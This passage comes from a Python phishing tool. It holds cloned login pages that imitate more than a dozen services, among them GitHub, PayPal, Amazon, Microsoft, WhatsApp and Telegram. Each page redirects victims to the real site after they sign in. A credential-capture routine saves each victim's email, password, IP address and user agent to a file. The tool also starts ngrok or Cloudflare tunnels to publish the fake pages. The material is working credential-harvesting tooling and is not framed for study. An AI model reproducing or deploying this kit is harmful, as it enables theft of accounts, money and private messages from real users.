    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <label>Steam account name</label>
      <input type="text" name="email" required autocomplete="username">
      <label>Password</label>
      <input type="password" name="password" required autocomplete="current-password">
      <button type="submit">Sign in</button>
    </form>
    <div class="help"><a href="#">Help, I can't sign in</a></div>
  </div>
</div>
</body>
</html>
'''
    },
    "github": {
        "display": "GitHub",
        "redirect": "https://github.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en" data-color-mode="dark">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to GitHub · GitHub</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#0d1117;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif;color:#c9d1d9}
.page{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100%;padding:20px}
.logo{margin-bottom:24px}
.logo svg{fill:#f0f6fc;width:48px;height:48px}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;width:100%;max-width:340px;box-sizing:border-box}
h1{font-size:24px;font-weight:300;text-align:center;margin:0 0 16px;color:#f0f6fc}
label{display:block;font-size:14px;font-weight:600;margin-bottom:8px;color:#c9d1d9}
input{
  width:100%;padding:5px 12px;margin:0 0 16px;border:1px solid #30363d;border-radius:6px;
  background:#0d1117;color:#c9d1d9;font-size:14px;box-sizing:border-box;outline:none;line-height:20px
}
input:focus{border-color:#58a6ff;box-shadow:0 0 0 3px rgba(56,139,253,.15)}
button{
  width:100%;background:#238636;color:#fff;border:1px solid rgba(240,246,252,.1);border-radius:6px;
  font-size:14px;font-weight:500;padding:5px 16px;cursor:pointer;line-height:20px
}
button:hover{background:#2ea043}
.error{color:#f85149;font-size:14px;margin:0 0 12px;text-align:center}
.footer{margin-top:16px;text-align:center;font-size:14px;color:#8b949e}
.footer a{color:#58a6ff;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="logo">
    <svg height="48" viewBox="0 0 16 16" width="48"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
  </div>
  <div class="card">
    <h1>Sign in to GitHub</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <label>Username or email address</label>
      <input type="text" name="email" required autocomplete="username">
      <label>Password</label>
      <input type="password" name="password" required autocomplete="current-password">
      <button type="submit">Sign in</button>
    </form>
  </div>
  <div class="footer">
    New to GitHub? <a href="#">Create an account</a>
  </div>
</div>
</body>
</html>
'''
    },
    "paypal": {
        "display": "PayPal",
        "redirect": "https://www.paypal.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log in to your PayPal account</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:PayPal Sans Big,Helvetica Neue,Arial,sans-serif;color:#2c2e2f}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:400px;text-align:center}
.logo{font-size:40px;font-weight:700;color:#003087;margin-bottom:32px;letter-spacing:-1px}
.logo span{color:#009cde}
input{
  width:100%;padding:12px 16px;margin:0 0 12px;border:1px solid #9da3a6;border-radius:4px;
  font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#0070ba;box-shadow:0 0 0 1px #0070ba}
button{
  width:100%;background:#0070ba;color:#fff;border:none;border-radius:24px;
  font-size:16px;font-weight:700;padding:14px;cursor:pointer;margin-top:8px
}
button:hover{background:#005ea6}
.error{color:#c72e2e;font-size:14px;margin:0 0 12px}
.forgot{display:block;margin:16px 0;color:#0070ba;font-size:14px;text-decoration:none}
.signup{margin-top:24px;font-size:14px;color:#2c2e2f}
.signup a{color:#0070ba;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <div class="logo">Pay<span>Pal</span></div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Email or mobile number" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log In</button>
    </form>
    <a class="forgot" href="#">Having trouble logging in?</a>
    <div class="signup">New to PayPal? <a href="#">Sign Up</a></div>
  </div>
</div>
</body>
</html>
'''
    },
    "amazon": {
        "display": "Amazon",
        "redirect": "https://www.amazon.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Amazon Sign-In</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:"Amazon Ember",Arial,sans-serif;color:#0f1111}
.page{display:flex;flex-direction:column;align-items:center;padding:20px;min-height:100%}
.logo{margin:20px 0;color:#131921;font-size:28px;font-weight:700}
.logo span{color:#ff9900}
.card{border:1px solid #ddd;border-radius:4px;padding:20px 26px;width:100%;max-width:350px;box-sizing:border-box}
h1{font-size:28px;font-weight:400;margin:0 0 14px;line-height:1.2}
label{display:block;font-size:13px;font-weight:700;margin-bottom:2px}
input{
  width:100%;padding:8px;margin:0 0 14px;border:1px solid #a6a6a6;border-radius:3px;
  font-size:13px;box-sizing:border-box;outline:none;box-shadow:0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset
}
input:focus{border-color:#e77600;box-shadow:0 0 3px 2px rgba(228,121,17,.5)}
button{
  width:100%;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;
  border-radius:3px;padding:8px;font-size:13px;cursor:pointer;box-shadow:0 1px 0 rgba(255,255,255,.4) inset
}
button:hover{background:linear-gradient(to bottom,#f5d78e,#eeb933)}
.error{color:#c40000;font-size:13px;margin:0 0 10px}
.help{margin-top:18px;font-size:13px}
.help a{color:#0066c0;text-decoration:none}
.divider{margin:18px 0;text-align:center;color:#767676;font-size:12px;position:relative}
.divider::before{content:"";position:absolute;left:0;top:50%;width:100%;height:1px;background:#e7e7e7;z-index:0}
.divider span{background:#fff;padding:0 8px;position:relative;z-index:1}
.create{display:block;width:100%;padding:8px;text-align:center;border:1px solid #adb1b8;border-radius:3px;background:linear-gradient(to bottom,#f7f8fa,#e7e9ec);font-size:13px;color:#0f1111;text-decoration:none;box-sizing:border-box}
</style>
</head>
<body>
<div class="page">
  <div class="logo">amazon<span>.com</span></div>
  <div class="card">
    <h1>Sign-In</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <label>Email or mobile phone number</label>
      <input type="text" name="email" required autocomplete="username">
      <label>Password</label>
      <input type="password" name="password" required autocomplete="current-password">
      <button type="submit">Sign-In</button>
    </form>
    <div class="help">
      <a href="#">Need help?</a>
    </div>
  </div>
  <div style="width:100%;max-width:350px;margin-top:20px">
    <div class="divider"><span>New to Amazon?</span></div>
    <a class="create" href="#">Create your Amazon account</a>
  </div>
</div>
</body>
</html>
'''
    },
    "microsoft": {
        "display": "Microsoft",
        "redirect": "https://outlook.live.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your Microsoft account</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;color:#1b1b1b}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:440px;border:1px solid #ddd;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px;box-sizing:border-box}
.logo{margin-bottom:16px}
.logo svg{height:24px}
h1{font-size:24px;font-weight:600;margin:0 0 8px;line-height:1.2}
.sub{font-size:15px;margin:0 0 24px;color:#1b1b1b}
input{
  width:100%;padding:10px;margin:0 0 16px;border:none;border-bottom:1px solid #666;
  font-size:15px;box-sizing:border-box;outline:none;background:transparent
}
input:focus{border-bottom-color:#0067b8}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:24px}
.actions a{color:#0067b8;font-size:13px;text-decoration:none}
button{
  background:#0067b8;color:#fff;border:none;padding:8px 20px;font-size:15px;cursor:pointer;min-width:108px
}
button:hover{background:#005a9e}
.error{color:#a80000;font-size:13px;margin:0 0 12px}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <div class="logo">
      <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
        <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
        <rect x="12" y="0" width="11" height="11" fill="#7fba00"/>
        <rect x="0" y="12" width="11" height="11" fill="#00a4ef"/>
        <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
        <text x="28" y="17" font-family="Segoe UI,Arial" font-size="16" font-weight="600" fill="#737373">Microsoft</text>
      </svg>
    </div>
    <h1>Sign in</h1>
    <div class="sub">to continue to Outlook</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="email" name="email" placeholder="Email, phone, or Skype" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <div class="actions">
        <a href="#">Can't access your account?</a>
        <button type="submit">Next</button>
      </div>
    </form>
  </div>
</div>
</body>
</html>
'''
    },
    "spotify": {
        "display": "Spotify",
        "redirect": "https://open.spotify.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login - Spotify</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#000;font-family:CircularSp,CircularSp-Arab,CircularSp-Hebr,CircularSp-Cyrl,CircularSp-Grek,CircularSp-Deva,Helvetica,Arial,sans-serif;color:#fff}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:450px;text-align:center}
.logo{margin-bottom:32px}
.logo svg{width:40px;height:40px;fill:#1ed760}
h1{font-size:48px;font-weight:700;margin:0 0 40px;line-height:1.2;letter-spacing:-1px}
input{
  width:100%;padding:14px;margin:0 0 16px;border:1px solid #727272;border-radius:4px;
  background:#121212;color:#fff;font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#fff}
button{
  width:100%;background:#1ed760;color:#000;border:none;border-radius:500px;
  font-size:16px;font-weight:700;padding:14px;cursor:pointer;margin-top:16px
}
button:hover{transform:scale(1.02);background:#1fdf64}
.error{color:#e91429;font-size:14px;margin:0 0 12px}
.forgot{display:block;margin:24px 0;color:#fff;font-size:14px;text-decoration:underline}
.signup{margin-top:16px;color:#a7a7a7;font-size:16px}
.signup a{color:#fff;text-decoration:underline}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 24 24"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/></svg>
    </div>
    <h1>Log in to Spotify</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Email or username" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log In</button>
    </form>
    <a class="forgot" href="#">Forgot your password?</a>
    <div class="signup">Don't have an account? <a href="#">Sign up for Spotify</a></div>
  </div>
</div>
</body>
</html>
'''
    },
    "reddit": {
        "display": "Reddit",
        "redirect": "https://www.reddit.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>reddit.com: Log in</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#dae0e6;font-family:Noto Sans,Arial,sans-serif;color:#1a1a1b}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{background:#fff;border-radius:4px;padding:24px;width:100%;max-width:360px;box-shadow:0 2px 4px rgba(0,0,0,.1);box-sizing:border-box}
h1{font-size:18px;font-weight:500;margin:0 0 20px;text-align:center}
input{
  width:100%;padding:12px;margin:0 0 12px;border:1px solid #edeff1;border-radius:4px;
  font-size:14px;box-sizing:border-box;outline:none;background:#fff
}
input:focus{border-color:#0079d3}
button{
  width:100%;background:#0079d3;color:#fff;border:none;border-radius:20px;
  font-size:14px;font-weight:700;padding:12px;cursor:pointer;text-transform:uppercase;letter-spacing:.5px
}
button:hover{background:#0060a8}
.error{color:#ea0027;font-size:12px;margin:0 0 10px;text-align:center}
.forgot{display:block;margin:12px 0;color:#0079d3;font-size:12px;text-decoration:none;text-align:center}
.signup{margin-top:16px;text-align:center;font-size:12px;color:#1a1a1b}
.signup a{color:#0079d3;font-weight:700;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Log in</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Username" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log In</button>
    </form>
    <a class="forgot" href="#">Forgot username or password?</a>
    <div class="signup">New to Reddit? <a href="#">Sign up</a></div>
  </div>
</div>
</body>
</html>
'''
    },
    "twitch": {
        "display": "Twitch",
        "redirect": "https://www.twitch.tv/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log In - Twitch</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#0e0e10;font-family:Roobert,Inter,"Helvetica Neue",Helvetica,Arial,sans-serif;color:#efeff1}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{background:#18181b;border-radius:6px;padding:30px;width:100%;max-width:400px;box-sizing:border-box}
h1{font-size:24px;font-weight:600;margin:0 0 24px;text-align:center}
label{display:block;font-size:12px;font-weight:600;margin-bottom:6px;color:#adadb8}
input{
  width:100%;padding:10px;margin:0 0 16px;border:1px solid #3a3a3d;border-radius:4px;
  background:#0e0e10;color:#efeff1;font-size:14px;box-sizing:border-box;outline:none
}
input:focus{border-color:#9147ff}
button{
  width:100%;background:#9147ff;color:#fff;border:none;border-radius:4px;
  font-size:14px;font-weight:600;padding:12px;cursor:pointer;margin-top:8px
}
button:hover{background:#772ce8}
.error{color:#eb0400;font-size:14px;margin:0 0 12px;text-align:center}
.forgot{display:block;margin:16px 0 0;color:#bf94ff;font-size:14px;text-decoration:none;text-align:center}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Log in to Twitch</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <label>Username</label>
      <input type="text" name="email" required autocomplete="username">
      <label>Password</label>
      <input type="password" name="password" required autocomplete="current-password">
      <button type="submit">Log In</button>
    </form>
    <a class="forgot" href="#">Forgot your password?</a>
  </div>
</div>
</body>
</html>
'''
    },
    "dropbox": {
        "display": "Dropbox",
        "redirect": "https://www.dropbox.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Dropbox</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:Atlas Grotesk,Helvetica Neue,Helvetica,Arial,sans-serif;color:#1e1919}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:400px;border:1px solid #d0d4d9;border-radius:8px;padding:30px;box-sizing:border-box}
h1{font-size:24px;font-weight:600;margin:0 0 24px;text-align:center}
input{
  width:100%;padding:12px;margin:0 0 12px;border:1px solid #d0d4d9;border-radius:4px;
  font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#0061ff;box-shadow:0 0 0 1px #0061ff}
button{
  width:100%;background:#0061ff;color:#fff;border:none;border-radius:4px;
  font-size:16px;font-weight:600;padding:12px;cursor:pointer;margin-top:8px
}
button:hover{background:#0052d9}
.error{color:#c9372c;font-size:14px;margin:0 0 12px;text-align:center}
.forgot{display:block;margin:16px 0 0;color:#0061ff;font-size:14px;text-decoration:none;text-align:center}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Sign in</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="email" name="email" placeholder="Email" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Sign in</button>
    </form>
    <a class="forgot" href="#">Forgot your password?</a>
  </div>
</div>
</body>
</html>
'''
    },
    "yahoo": {
        "display": "Yahoo",
        "redirect": "https://mail.yahoo.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Yahoo</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:Yahoo Sans,Helvetica Neue,Helvetica,Arial,sans-serif;color:#1d2228}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:360px;text-align:center}
.logo{font-size:32px;font-weight:700;color:#6001d2;margin-bottom:24px}
input{
  width:100%;padding:12px;margin:0 0 12px;border:1px solid #ccc;border-radius:4px;
  font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#6001d2}
button{
  width:100%;background:#6001d2;color:#fff;border:none;border-radius:24px;
  font-size:16px;font-weight:600;padding:14px;cursor:pointer;margin-top:8px
}
button:hover{background:#4a00a8}
.error{color:#c8102e;font-size:14px;margin:0 0 12px}
.forgot{display:block;margin:16px 0;color:#6001d2;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <div class="logo">Yahoo</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Username, email, or mobile" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Next</button>
    </form>
    <a class="forgot" href="#">Forgot username?</a>
  </div>
</div>
</body>
</html>
'''
    },
    "pinterest": {
        "display": "Pinterest",
        "redirect": "https://www.pinterest.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Pinterest</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",Helvetica,Arial,sans-serif;color:#111}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:400px;text-align:center}
h1{font-size:32px;font-weight:600;margin:0 0 8px}
.sub{color:#767676;font-size:16px;margin:0 0 24px}
input{
  width:100%;padding:12px 16px;margin:0 0 12px;border:2px solid #ddd;border-radius:16px;
  font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#111}
button{
  width:100%;background:#e60023;color:#fff;border:none;border-radius:24px;
  font-size:16px;font-weight:700;padding:12px;cursor:pointer;margin-top:8px
}
button:hover{background:#ad081b}
.error{color:#e60023;font-size:14px;margin:0 0 12px}
.forgot{display:block;margin:16px 0;color:#111;font-size:14px;font-weight:600;text-decoration:none}
.signup{margin-top:16px;font-size:14px}
.signup a{color:#e60023;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Welcome to Pinterest</h1>
    <div class="sub">Find new ideas to try</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="email" name="email" placeholder="Email" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log in</button>
    </form>
    <a class="forgot" href="#">Forgot your password?</a>
    <div class="signup">Not on Pinterest yet? <a href="#">Sign up</a></div>
  </div>
</div>
</body>
</html>
'''
    },
    "ebay": {
        "display": "eBay",
        "redirect": "https://www.ebay.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in or Register | eBay</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:"Market Sans",Arial,sans-serif;color:#111}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:380px}
h1{font-size:28px;font-weight:700;margin:0 0 24px;text-align:center}
input{
  width:100%;padding:12px;margin:0 0 12px;border:1px solid #ccc;border-radius:8px;
  font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#3665f3;box-shadow:0 0 0 1px #3665f3}
button{
  width:100%;background:#3665f3;color:#fff;border:none;border-radius:24px;
  font-size:16px;font-weight:700;padding:14px;cursor:pointer;margin-top:8px
}
button:hover{background:#2b4acb}
.error{color:#e53238;font-size:14px;margin:0 0 12px;text-align:center}
.forgot{display:block;margin:16px 0;color:#3665f3;font-size:14px;text-decoration:none;text-align:center}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Hello</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Email or username" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Sign in</button>
    </form>
    <a class="forgot" href="#">Forgot your password?</a>
  </div>
</div>
</body>
</html>
'''
    },
    "whatsapp": {
        "display": "WhatsApp",
        "redirect": "https://web.whatsapp.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WhatsApp</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#0b141a;font-family:Segoe UI,Helvetica Neue,Helvetica,Lucida Grande,Arial,Ubuntu,Cantarell,Fira Sans,sans-serif;color:#e9edef}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{background:#111b21;border-radius:8px;padding:40px;width:100%;max-width:400px;box-sizing:border-box;text-align:center}
h1{font-size:28px;font-weight:400;margin:0 0 8px}
.sub{color:#8696a0;font-size:14px;margin:0 0 32px}
input{
  width:100%;padding:14px;margin:0 0 12px;border:1px solid #2a3942;border-radius:8px;
  background:#2a3942;color:#e9edef;font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#00a884}
button{
  width:100%;background:#00a884;color:#111b21;border:none;border-radius:24px;
  font-size:16px;font-weight:600;padding:14px;cursor:pointer;margin-top:16px
}
button:hover{background:#008f72}
.error{color:#ea0038;font-size:14px;margin:0 0 12px}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>WhatsApp</h1>
    <div class="sub">Enter your phone number and password to continue</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Phone number" required autocomplete="username">
      <input type="password" name="password" placeholder="Password / PIN" required autocomplete="current-password">
      <button type="submit">Continue</button>
    </form>
  </div>
</div>
</body>
</html>
'''
    },
    "telegram": {
        "display": "Telegram",
        "redirect": "https://web.telegram.org/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Telegram Web</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#0e1621;font-family:Roboto,Helvetica Neue,Arial,sans-serif;color:#fff}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:360px;text-align:center}
h1{font-size:28px;font-weight:500;margin:0 0 8px}
.sub{color:#7d8b99;font-size:15px;margin:0 0 32px}
input{
  width:100%;padding:14px;margin:0 0 12px;border:1px solid #232e3c;border-radius:8px;
  background:#17212b;color:#fff;font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#2aabee}
button{
  width:100%;background:#2aabee;color:#fff;border:none;border-radius:8px;
  font-size:16px;font-weight:500;padding:14px;cursor:pointer;margin-top:12px
}
button:hover{background:#229ed9}
.error{color:#e53935;font-size:14px;margin:0 0 12px}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Telegram</h1>
    <div class="sub">Please enter your phone number and password</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Phone number" required autocomplete="username">
      <input type="password" name="password" placeholder="Password / 2FA" required autocomplete="current-password">
      <button type="submit">Next</button>
    </form>
  </div>
</div>
</body>
</html>
'''
    },
    "snapchat": {
        "display": "Snapchat",
        "redirect": "https://www.snapchat.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Snapchat</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fffc00;font-family:Avenir Next,Avenir,Helvetica Neue,sans-serif;color:#000}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{background:#fff;border-radius:12px;padding:30px;width:100%;max-width:340px;box-sizing:border-box;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1)}
h1{font-size:28px;font-weight:700;margin:0 0 24px}
input{
  width:100%;padding:12px;margin:0 0 12px;border:1px solid #ccc;border-radius:8px;
  font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#000}
button{
  width:100%;background:#000;color:#fff;border:none;border-radius:30px;
  font-size:16px;font-weight:600;padding:14px;cursor:pointer;margin-top:8px
}
button:hover{background:#333}
.error{color:#e02020;font-size:14px;margin:0 0 12px}
.forgot{display:block;margin:16px 0 0;color:#000;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Log in to Snapchat</h1>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Username or Email" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log In</button>
    </form>
    <a class="forgot" href="#">Forgot your password?</a>
  </div>
</div>
</body>
</html>
'''
    },
}

# ── storage ─────────────────────────────────────────────────────────────
credentials = []
lock = threading.Lock()
tunnel_procs = []

def load_creds():
    global credentials
    if os.path.exists(CRED_FILE):
        try:
            with open(CRED_FILE, "r") as f:
                credentials = json.load(f)
        except Exception:
            credentials = []

def save_cred(platform, email, password, ip, ua):
    entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "platform": platform,
        "email": email,
        "password": password,
        "ip": ip,
        "user_agent": ua
    }
    with lock:
        credentials.append(entry)
        with open(CRED_FILE, "w") as f:
            json.dump(credentials, f, indent=2)
    print(f"[+] CAPTURED  {platform.upper():12}  {email}:{password}  from {ip}")

load_creds()

# ── tunnel helpers ──────────────────────────────────────────────────────
def find_bin(name):
    return shutil.which(name)

def start_ngrok(port):
    ngrok = find_bin("ngrok")
    if not ngrok:
        print("[-] ngrok not found in PATH. Install from https://ngrok.com/download")
        return None
    print("[*] Starting ngrok...")
    proc = subprocess.Popen(
        [ngrok, "http", str(port), "--log=stdout"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    tunnel_procs.append(proc)
    # wait for public url
    for _ in range(30):
        try:
            r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=1)
            data = r.json()
            for t in data.get("tunnels", []):
                if t.get("proto") == "https":
                    url = t["public_url"]
                    print(f"[+] ngrok ready → {url}")
                    return url
        except Exception:
            pass
        time.sleep(0.5)
    print("[-] ngrok started but public URL not found")
    return None

def start_cloudflare(port):
    # cloudflared or cloudflare-tunnel
    cf = find_bin("cloudflared") or find_bin("cloudflare-tunnel")
    if not cf:
        print("[-] cloudflared not found. Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/")
        return None
    print("[*] Starting cloudflare tunnel...")
    proc = subprocess.Popen(
        [cf, "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    tunnel_procs.append(proc)
    # parse stdout for the trycloudflare url
    start = time.time()
    while time.time() - start < 25:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.2)
            continue
        if "trycloudflare.com" in line or "https://" in line:
            # extract url
            for part in line.split():
                if part.startswith("https://") and "trycloudflare.com" in part:
                    url = part.strip()
                    print(f"[+] cloudflare ready → {url}")
                    return url
    print("[-] cloudflare tunnel started but public URL not found")
